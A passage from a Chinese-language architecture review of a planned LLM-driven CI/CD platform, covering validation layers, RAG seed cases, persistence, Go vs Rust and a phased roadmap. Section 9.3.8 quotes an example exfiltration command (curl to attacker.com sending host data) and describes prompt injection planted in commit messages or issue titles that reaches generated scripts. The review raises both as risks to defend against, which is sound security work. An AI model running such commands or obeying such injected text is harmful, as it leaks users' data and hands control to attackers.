2. **DAG 拓扑错误**：
   - 死节点：存在没有入边的非起始节点（孤立节点，永不执行也永不被感知）
   - 隐式环：通过共享 Workspace 产生的数据依赖未被 DAG 边建模，导致两个步骤间产生隐式竞态条件
3. **环境兼容性错误**：用户指定镜像 `golang:1.22`，但目标 Worker 节点为 ARM 架构（Apple Silicon），而 `golang:1.22` 在该硬件上不存在或行为不同
4. **资源约束冲突**：两个 Step 都需要 `privileged: true` 和 host port 8080，Validator 未检测端口冲突

**应对建议**

- **Validator 扩展为三层校验架构**：
  1. **语法层（Syntax Validation）**：JSON Schema 校验（文档已有，保留）
  2. **拓扑层（Topology Validation）**：DAG 合法性检查（可达性、无环、连通性、无孤立节点）。可由常规图算法实现，不需要 LLM 参与
  3. **语义层（Semantic Validation）**：插件存在性 + 版本兼容性 + Worker 环境匹配 + 资源冲突检测。这一层需要在后端维护一个环境兼容性矩阵

---

#### 9.3.5 【中风险】RAG 冷启动死锁

**问题描述**

系统依赖 RAG 检索相似案例来指导 Fixer 生成修复方案。但在 MVP 阶段，系统没有任何历史故障案例。

> RAG 库为空 → Fixer 靠 LLM 零样本推理 → 修复准确率低 → 用户不信任、拒绝修复建议 → 无法积累 Positive/Negative 样本 → RAG 库永远无法建立

这是一个典型的平台型产品冷启动死锁。

**应对建议**

**这是一项体力活，不可跳过。** 在 Phase 1 上线前，手动构建种子案例库：

| 案例类别 | 数量 | 示例 |
| :--- | :---: | :--- |
| 镜像拉取失败 | 10-15 | `no such image`, `manifest not found`, `unauthorized: access denied` |
| 网络连接失败 | 10-15 | `Connection refused`, `dial tcp: lookup`, `TLS handshake timeout` |
| 凭证过期 | 10-15 | `401 Unauthorized`, `authentication required`, `certificate has expired` |
| 权限不足 | 10-15 | `Permission denied`, `Forbidden`, `cannot open file` |
| 资源耗尽 | 5-10 | `no space left on device`, `cannot allocate memory`, `cannot create container` |

每条种子案例包含：**原始错误日志片段 → 脱敏后日志 → 故障根因分类 → 修复操作指令**。

建议 **50-100 条**种子案例即可覆盖 CI/CD 日常故障的 Top 80%。这本质上是知识工程，但不可跳过。

---

#### 9.3.6 【中风险】持久化层缺失

**问题描述**

文档 3.2.1 节定义的 `PipelineState` 为 `TypedDict`（内存对象），但生产级 CI/CD 系统对持久化有刚性需求：

1. **审计与合规**：每次流水线执行的历史记录、谁在何时做了什么修改、Copilot 模式下的人工审批记录——都需要不可篡改的审计日志
2. **长时运行的可靠性**：复杂流水线可能执行数十分钟甚至数小时。Worker 进程重启或滚动更新导致内存状态丢失，将使进行中的流水线必须从头重跑
3. **多租户隔离**：企业级部署中，不同团队、不同项目的流水线配置、缓存、Secrets 影子元数据需要严格隔离。后期加上多租户的成本远高于首日做好。
4. **影子元数据本身的持久化**：`get_available_secrets()` 返回的资产元数据需要有存储后端管理增删改查

**应对建议**

- **首选 PostgreSQL**：CI/CD 场景需要复杂查询（历史流水线搜索、审计日志过滤、聚合统计）和事务保障。PostgreSQL 的 JSONB 类型可以很好地存储 DAG 快照。
- **Redis 作为状态缓存**：用于 WebSocket 实时推送和 `PipelineState` 的短时缓存。PostgreSQL 做持久化底座，Redis 做性能加速。
- **PipelineState 的持久化时机**：每个 LangGraph Node 执行完毕后将 State 序列化落盘。Worker 重启后可从最新 Checkpoint 恢复。
- **多租户模型首日设计**：`tenant_id` 作为所有核心表的分区键，API Key 鉴权与租户绑定。

---

#### 9.3.7 【低风险】Go vs Rust 的语言选择

**问题描述**

文档写的是"Go/Rust"，但两者在工程栈中差异巨大，混用表述可能掩盖技术选型的决策冲突：

| 维度 | Go | Rust |
| :--- | :--- | :--- |
| Docker SDK 成熟度 | `docker/docker/client` 生态极为成熟、API 覆盖全面 | `bollard` 可用，但社区较小，部分功能需手写 HTTP 调用 |
| Worker 典型瓶颈 | 容器 I/O 等待（非 CPU 密集），Go 的 goroutine 调度完全胜任 | 引入 unsafe 和 async 复杂性，收益甚微 |
| 开发迭代速度 | 快速编译、可读性强、团队招聘容易 | 编译慢、所有权模型学习曲线陡峭、招聘难度大 |
| 系统调用层控制 | GC 停顿在容器编排场景可忽略 | 零 GC，但对本项目不是关键差异 |

**应对建议**

MVP 阶段锁定为 **Go**。Worker 节点的核心职责是容器编排 + 网络请求分发，这是 Go 的标准应用场景。如果后续发现极致的性能需求（如处理数千并发 Worker 节点的流式日志），可以局部用 Rust 重写热点路径。

---

#### 9.3.8 【低风险（Phase 3）】自定义脚本生成的本质是未解决的 AI 安全问题

**问题描述**

Phase 3 允许大模型直接生成 Shell/Python 脚本并在流水线中执行，文档提出了沙箱隔离方案（Dind 或 MicroVM）。但即使有沙箱：

1. **数据外泄通道**：即使容器被沙箱隔离，LLM 生成的脚本仍可以通过网络将数据发送到外部服务器（`curl https://attacker.com?data=$(cat /etc/hostname)`）。沙箱内的网络出站是默认可用的。
2. **提示词注入的级联风险**：攻击者可以在 git commit message 或 Issue 标题中注入提示词，当 LLM 读取这些内容并生成脚本时，提示词注入被"二阶传递"到执行环境中。这是当前 AI 安全领域尚未完全解决的问题。
3. **Token 消耗不可控**：一次"生成一个自动修复的脚本"的 LLM 调用可能消耗数十万 Token，且可能因 LLM 输出过长产生幻觉。

**应对建议**

**官方建议将 Phase 3 标记为 "Future / Research"，不要在 1.0 版本中承诺。** 这本质上是一个开放的安全研究问题，而非一个可以靠工程交付的 feature。如果在用户侧的预期管理中不加以区分，Phase 3 将成为整个项目的责任黑洞。

---

### 9.4 分阶段可行性评分矩阵

| 阶段 | 可行性评级 | 推荐团队规模 | 预估工期 | 最大单一风险 |
| :--- | :---: | :---: | :---: | :--- |
| **Phase 1：报错分析与修复提示** | 🟢 **高** | 2-3 人 | 2-3 个月 | RAG 冷启动（需手动构建种子库） |
| **Phase 2：自然语言编排流水线** | 🟡 **中** | 3-4 人 | 4-6 个月 | LangGraph 状态机中断恢复 + 语义层验证 |
| **Phase 3：自定义 Step 脚本生成** | 🔴 **低（建议推迟至 Roadmap 远期）** | 4-5 人 | 6-12+ 个月 | 提示词注入通过二阶传递突破沙箱（未解决的研究级问题） |

### 9.5 核心行动建议

1. **Phase 1 独立发布，不等 Phase 2。** 报错分析功能本身就是一个有独立价值的产品，可以以 VSCode 插件或 CLI 工具的形式先行交付。先跑出用户、跑出数据、跑出信任，再扩展能力。
2. **技术栈锁 Go，不做 Rust 双轨并行。** 开发速度是 MVP 的第一约束。Go 的 Docker SDK 生态、编译速度、团队招聘难度都更优。
3. **Phase 1 上线前手工构建 50-100 条 RAG 种子案例。** 这是一项不可跳过的知识工程工作量，直接影响 Phase 1 核心功能的用户体验。
4. **Validator 在 Phase 2 前补充语义校验层。** JSON Schema + 拓扑检查 + 语义匹配，三层缺一不可。
5. **Phase 3 在对外文档中统一标记为 "Future"。** 防止在用户预期管理中出现无法兑现的承诺，避免该阶段成为项目的责任黑洞。
6. **持久化方案首日确定，多租户模型首日设计。** `tenant_id` 分片、PostgreSQL 底座、Redis 缓存加速。

### 9.6 推荐实施路线图

```
Month 1-2   ── Phase 1 MVP：Log Classifier + RAG 种子库 + LLM 修复卡片
               交付形式：CLI 工具 或 VSCode 插件
               关键技术选型锁定的 Deadline：Go、PostgreSQL、Docker SDK

Month 3-4   ── Phase 1 完善 + Canvas/Sidebar UI 开发
               交付形式：Web UI（含异步执行日志查看）
               启动 RAG 种子库的扩充（从 50 条到 200+ 条）

Month 5-8   ── Phase 2 MVP：Planner + Validator（三层校验）+ 简单 DAG 执行
               只支持串行流水线，不支持并行 Step
               Copilot 模式优先，Autopilot 标记为 Beta

Month 9-12  ── Phase 2 完善：并行 Step、增量重试、Autopilot GA
               开始积累 Feedback 数据资产

Month 13+   ── Phase 3 预研：评估沙箱方案（MicroVM / gVisor / Firecracker）
               仅在充分的 Red Team 安全审计后考虑开放
```

---

> **编写说明**：本文档第 9 章为架构审查与可行性评估，基于第 1-8 章架构设计的技术审查生成。评估结论和建议适用于技术决策参考，不构成对项目成功与否的最终判断。

